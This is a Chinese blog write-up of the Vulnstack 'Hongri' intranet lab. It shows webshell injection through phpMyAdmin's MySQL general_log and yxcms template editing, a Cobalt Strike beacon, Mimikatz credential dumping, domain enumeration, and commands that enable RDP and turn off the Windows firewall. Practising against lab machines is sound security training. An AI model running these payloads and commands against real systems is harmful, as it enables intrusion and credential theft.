1%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316195846234-826611618.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316200115555-2063206.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316201714462-967954062.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316202702006-1037964138.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317081913071-1261719240.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164731295-1003420215.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164822903-1528659583.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164517415-1798252375.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316212756885-1839789078.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317081913071-1261719240.png","https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317093025411-81491533.png"],"datePublished":"2023-09-20T10:25:12.000Z","dateModified":"2023-10-14T11:27:28.466Z","author":{"@type":"Person","name":"1vxyz"},"publisher":{"@type":"Organization","name":"≧▽≦","logo":{"@type":"ImageObject","url":"https://1vxyz.github.io/img/logo.jpg"}},"description":"&lt;1&gt; 环境搭建靶场下载链接：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;虚拟机所有统一密码：hongrisec@2019(有的会提示密码已过期，随便改改 我改成了Hongrisec@2019)网络拓扑图如下："}</script><link rel="canonical" href="https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.jpg" alt="≧▽≦" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-09-20T10:25:12.000Z" title="2023/9/20 18:25:12">2023-09-20</time>发表</span><span class="level-item"><time dateTime="2023-10-14T11:27:28.466Z" title="2023/10/14 19:27:28">2023-10-14</time>更新</span><span class="level-item">33 分钟读完 (大约4968个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Vulnstack-红日安全内网靶场[一]</h1><div class="content"><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="&lt;1&gt; 环境搭建"></a>&lt;1&gt; 环境搭建</h1><p>靶场下载链接：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>虚拟机所有统一密码：hongrisec@2019(有的会提示密码已过期，随便改改 我改成了Hongrisec@2019)<br>网络拓扑图如下：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309202513912-2072192058.png"></p>
<span id="more"></span>

<p>这里我设置的网络是VMnet3和VMnet8，其实无所谓设置哪两个网络，最重要的是需要两个网络，且不能在同一个网段内（因为需要一个做外网一个做内网）</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309212500653-720406678.png"></p>
<p>ip配置如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali (攻击机)：192.168.236.128 （VMnet8 网卡分配的IP）</span><br><span class="line">Windows 7 (web服务器)：192.168.236.132（外网和kali连通）、192.168.52.143（内网ip）</span><br><span class="line">Windows 2008 (域控)：192.168.52.138</span><br><span class="line">Win2k3 (域管)：192.168.22.</span><br></pre></td></tr></table></figure>
<p>【注意】实际上域环境三台虚拟机的 IP 初始状态就已经被配置为固定的 192.168.52.XXX&#x2F;24网段（同时已配置好域控 IP 必定为 192.168.52.138），故 我们要设置的内网网卡 即 VMware 的 VMnet3 网卡应注意也配置为 192.168.52.XXX&#x2F;24 网段  (把VMnet3改成其他的也可以，但是那样还需要自己去网络里修改一下被配置的固定192.168.52.XXX&#x2F;24网段  麻烦一点，就用52吧)</p>
<h2 id="1-配置Win7-web服务器网络"><a href="#1-配置Win7-web服务器网络" class="headerlink" title="(1) 配置Win7 web服务器网络"></a>(1) 配置Win7 web服务器网络</h2><p>从网络拓扑图得知，需要模拟内网和外网两个网段， Win7 虚拟机相当于网关服务器，所以需要两张网卡，故需要配置两个网络适配器（网卡），点击添加网络设配器：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309212705872-712435605.png"></p>
<p>右键右下角电脑图标 -&gt; 打开网络和共享中心 -&gt; 更改适配器设置 -&gt; 右键网络本地连接(点属性) -&gt; 选Internet 协议版本 4(TCP&#x2F;ipv4) 即可设置IP地址为 192.168.236.132</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309213437049-617388238.png"></p>
<p>能ping 通kali机，说明和外网已经连通了，这里还有一点就是记得把WIndows 7这个web服务器防火墙的关闭，否则kali会ping 不通</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309213932511-1928891713.png"></p>
<p>同理 内网ip设置为：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230309213643079-1608053267.png"></p>
<p>ping一下DC机，域内网络也配置正常</p>
<p>在 Win7 外网服务器主机的 C 盘找到 PhpStudy 启动 Web 服务（模拟外网 Web 站点）：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315175734413-264651648.png"></p>
<p>开启之后，我们在我们的主机 访问一下win7，可以正常访问到PHP探针</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315175914363-1511025758.png"></p>
<p>这样我们的环境就相当于是配置好啦</p>
<h2 id="2-配置-Winserver-2008网络-DC域控"><a href="#2-配置-Winserver-2008网络-DC域控" class="headerlink" title="(2) 配置 Winserver 2008网络(DC域控)"></a>(2) 配置 Winserver 2008网络(DC域控)</h2><p>hongrisec@2019 登录的时候，显示密码过期   自己改成了 Hongrisec@2019</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315173213438-1681522261.png"></p>
<p>Win2008 DC域控主机ip为 192.168.52.138 默认配好了的</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315173616495-1279208402.png"></p>
<h2 id="3-配置-Win2003-win2k3网络-域成员"><a href="#3-配置-Win2003-win2k3网络-域成员" class="headerlink" title="(3) 配置 Win2003&#x2F;win2k3网络(域成员)"></a>(3) 配置 Win2003&#x2F;win2k3网络(域成员)</h2><p>域内主机 win2003 ip为192.168.236.141  与外网不连通<br><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315175229095-561473635.png"></p>
<h1 id="外网边界突破"><a href="#外网边界突破" class="headerlink" title="&lt;2&gt; 外网边界突破"></a>&lt;2&gt; 外网边界突破</h1><h2 id="1-信息收集-弱口令-开放了phpmyadmin、yxcms"><a href="#1-信息收集-弱口令-开放了phpmyadmin、yxcms" class="headerlink" title="(1) 信息收集(弱口令+开放了phpmyadmin、yxcms)"></a>(1) 信息收集(弱口令+开放了phpmyadmin、yxcms)</h2><p>在外网站点看见了一个MySQL 连接检测：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315180925585-1188872974.png"></p>
<p>检测一下，存在弱口令  root:root 连接正常   但单从这只能检测，还利用不了呢<br>扫一下目录，看看有什么东西。扫描到了 phpmyadmin</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315181450186-2045186056.png"></p>
<p>访问&#x2F;phpmyadmin 使用 刚刚检测到的 root:root 登录一下，成功登录进去了</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315181631294-776244288.png"></p>
<p>phpmyadmin是一个以 PHP 为基础，以 Web-Base 方式架构在网站主机上的 MySQL 的数据库管理工具，让管理者可用 Web 接口管理 MySQL 数据库</p>
<p>在里面看见了mysql数据库和一个 yxcms的数据库，应该也存在一个yxcms服务</p>
<h2 id="2-PhpMyAdmin-后台-Getshell"><a href="#2-PhpMyAdmin-后台-Getshell" class="headerlink" title="(2) PhpMyAdmin 后台 Getshell"></a>(2) PhpMyAdmin 后台 Getshell</h2><p>phpmyadmin有两种getshell方式：</p>
<ul>
<li>into outfile导出木马</li>
<li>利用Mysql日志文件getshell</li>
</ul>
<p>我们挨个试一下。</p>
<h3 id="尝试into-outfile导出木马（失败）"><a href="#尝试into-outfile导出木马（失败）" class="headerlink" title="-尝试into outfile导出木马（失败）"></a>-尝试into outfile导出木马（失败）</h3><p>执行 <code>select @@basedir;</code> 查看一下网站的路径</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315182531731-1987192005.png"></p>
<p>路径为：<code>C:/phpStudy/MySQL/</code></p>
<p>再执行 <code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;C:/phpStudy/www/hack.php&#39;;</code> 直接将木马写入到 www网站根目录下    失败</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315182827245-334324103.png"></p>
<p>这是因为 Mysql新特性secure_file_priv会对读写文件产生影响，该参数用来限制导入导出。我们可以借助<code>show global variables like &#39;%secure%&#39;;</code>命令来查看该参数</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315183007445-2103222599.png"></p>
<p>当secure_file_priv为NULL时，表示限制Mysql不允许导入导出，这里为NULL。所以into outfile写入木马出错。要想使得该语句导出成功，则需要在Mysql文件夹下修改my.ini 文件，在[mysqld]内加入secure_file_priv &#x3D;””。</p>
<p>直接写入木马不行，那我们就换另一种方法—Mysql日志文件写入shell</p>
<h3 id="利用Mysql日志文件写入shell"><a href="#利用Mysql日志文件写入shell" class="headerlink" title="-利用Mysql日志文件写入shell"></a>-利用Mysql日志文件写入shell</h3><p>先执行命令：<code>show variables like &#39;%general%&#39;;</code> 查看日志状态：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315183624844-1253055822.png"></p>
<p>当开启 general_log 时，所执行的 SQL 语句都会出现在 stu1.log 文件中。那么如果修改 general_log_file 的值为一个php文件，则所执行的 SQL 语句就会对应生成在对应的文件中，进而可 Getshell</p>
<p><code>SET GLOBAL general_log=&#39;on&#39;</code><br>开启 general_log</p>
<p><code>SET GLOBAL general_log_file=&#39;C:/phpStudy/www/hack.php&#39;</code><br>指定日志写入到网站根目录的 hack.php 文件</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315184348352-1477207232.png"></p>
<p>然后接下来执行 SQL 语句：<code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code>，即可将一句话木马写入 hack.php 文件中 访问&#x2F;hack.php 成功写入</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315184548170-2090375042.png"></p>
<p>上蚁剑  连上去了</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315185024347-255048480.png"></p>
<h2 id="3-yxcms后台上传getshell"><a href="#3-yxcms后台上传getshell" class="headerlink" title="(3)yxcms后台上传getshell"></a>(3)yxcms后台上传getshell</h2><p>前面我们登录进去之后，可以看到还有一个yxcms的数据库，同时我们进入后台之后，可以看到一个 beifen.rar备份文件和yxcms目录，这道题其实还有一种getshell的方法，这里我们也记录一下。 字典不够强大，没扫出来 beifen.rar和 &#x2F;yxcms  </p>
<p>访问&#x2F;yxcms，可以看到在公告处，泄露了 yxcms的admin后台登录路径 以及 默认的密码</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315195959223-1060970212.png"></p>
<p>成功登录到后台</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315200128746-1818698453.png"></p>
<p>xxcms，既然后台都登录到了，那拿shell还不简单吗，一般就是找一找模板编辑的地方，写入一句话🐎，或者写入日志，这里刚好就有编辑模板的地方，我们新增一个shell.php </p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315200253518-70372448.png"></p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315200511436-850715920.png"></p>
<p>建立是建立了，shell.php 生成到哪了呢？？ 这里就需要我们前面提到的 beifen.rar 备份文件了，我们把备份文件解压，在里面寻找模板的这么多php 都存放在了:<code>/yxcms/protected/apps/default/view/default/</code><br>因此我们的shell.php 就生成在了这里</p>
<p>蚁剑连接 拿到shell</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315201149525-1091376910.png"></p>
<h1 id="内网信息探测"><a href="#内网信息探测" class="headerlink" title="&lt;3&gt; 内网信息探测"></a>&lt;3&gt; 内网信息探测</h1><p>我们在拿到的shell 执行 <code>whoami</code> 发现是administrator权限 在域中<br><code>ifconfig</code> 发现了内网网段 192.168.52.0&#x2F;24</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315202003387-541137026.png"></p>
<h2 id="1-靶机上线CS"><a href="#1-靶机上线CS" class="headerlink" title="(1) 靶机上线CS"></a>(1) 靶机上线CS</h2><p>在kali里 <code>./teamserver 192.168.236.128 cs123456</code> 运行cs服务</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315202523885-1531715127.png"></p>
<p>主机运行CS 客户端并连接 CS 服务端，配置好listener监听器之后，生成 exe后门程序</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315202803226-19896095.png"></p>
<p>利用蚁剑 把生成的artifact.exe 上传到靶机上：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315203057642-379097278.png"></p>
<p>在终端里执行 artifact.exe 可以看到靶机上线到CS上</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315203258458-356901985.png"></p>
<p>可使用 Mimikatz 直接抓取本机用户密码：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315204939286-47519854.png"></p>
<p>这里抓取到密码之后，我们执行 net view 发现了域内另外俩台机器点击这里可以看到</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164731295-1003420215.png"></p>
<p>可以利用抓取到的密码 psexec取login一下 监听器选 windows_smb&#x2F;bind_pipe</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164822903-1528659583.png"></p>
<p>拿到正向会话(前面三层内网靶机有讲正向反向)之后，我们可以右键 目标-&gt;文件管理</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164517415-1798252375.png"></p>
<p>可以看到域控的文件 我们可以进行上传文件操作，算是打通了 这是CS可以用到的一点。这里能拿到是因为我们域控的密码和win7、密码设置一样了。刚好可以拿下 我们下面再看看其他方法 横向移动拿到域控和域内其他机器</p>
<h2 id="2-域内信息收集"><a href="#2-域内信息收集" class="headerlink" title="(2) 域内信息收集"></a>(2) 域内信息收集</h2><p>内网信息收集的主要目的就是查找域控以及域内的其他主机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net view                 <span class="comment"># 查看局域网内其他主机名</span></span><br><span class="line">net config Workstation   <span class="comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></span><br><span class="line">net user                 <span class="comment"># 查看本机用户列表</span></span><br><span class="line">net user /domain         <span class="comment"># 查看域用户</span></span><br><span class="line">net localgroup administrators <span class="comment"># 查看本地管理员组（通常会有域用户）</span></span><br><span class="line">net view /domain         <span class="comment"># 查看有几个域</span></span><br><span class="line">net user 用户名 /domain   <span class="comment"># 获取指定域用户的信息</span></span><br><span class="line">net group /domain        <span class="comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></span><br><span class="line">net group 组名 /domain    <span class="comment"># 查看域中某工作组</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  <span class="comment"># 查看域管理员的名字</span></span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain  <span class="comment"># 查看域中的其他主机名</span></span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  <span class="comment"># 查看域控制器主机名（可能有多台）</span></span><br></pre></td></tr></table></figure>
<p>1、先判断是否存在域，使用 <code>ipconfig /all</code> 查看 DNS 服务器，发现主 DNS 后缀不为空，存在域god.org</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315211947011-327186575.png"></p>
<p>也可以执行命令<code>net config workstation</code> 来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315212710924-1858751632.png"></p>
<p>2、上面发现 DNS 服务器名为 god.org，当前登录域为 GOD 再执行<code>net view /domain</code>查看有几个域(可能有多个)</p>
<p>3、查看域的组账户信息(工作组)</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315213941617-1248511022.png"></p>
<p>4、既然只有一个域，那就利用 net group “domain controllers” &#x2F;domain 命令查看域控制器主机名，直接确认域控主机的名称为 OWA</p>
<p>5、确认域控主机的名称为 OWA 再执行 <code>net view</code> 查看局域网内其他主机信息（主机名称、IP地址）</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230315204458476-1029263880.png"></p>
<p>扫描出来 除了域控OWA 之外，还有一台主机ROOT-TVI862UBEH</p>
<p>至此内网域信息收集完毕，已知信息：域控主机：192.168.52.138，同时还存在一台域成员主机：192.168.52.141，接下来的目标就是横向渗透拿下域控</p>
<h2 id="3-rdp远程登陆win7"><a href="#3-rdp远程登陆win7" class="headerlink" title="(3) rdp远程登陆win7"></a>(3) rdp远程登陆win7</h2><p>Win7跳板机 默认是不开启3389的，同时还有防火墙</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注册表开启3389端口</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加防火墙规则</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Open 3389&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=3389</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode <span class="built_in">disable</span>   			<span class="comment">#winsows server 2003 之前</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off 	<span class="comment">#winsows server 2003 之后</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317094234406-459226645.png"></p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317094154350-482099469.png"></p>
<p>这里我们以域用户 administrator登录。</p>
<p>输入我们刚从CS上 mimikatz dump下来的密码Hongrisec@2019 (也可以自己 net user创建一个用户 加入到administrator组里 用那个账户登录)</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317094848041-1174558797.png"></p>
<p>成功连接</p>
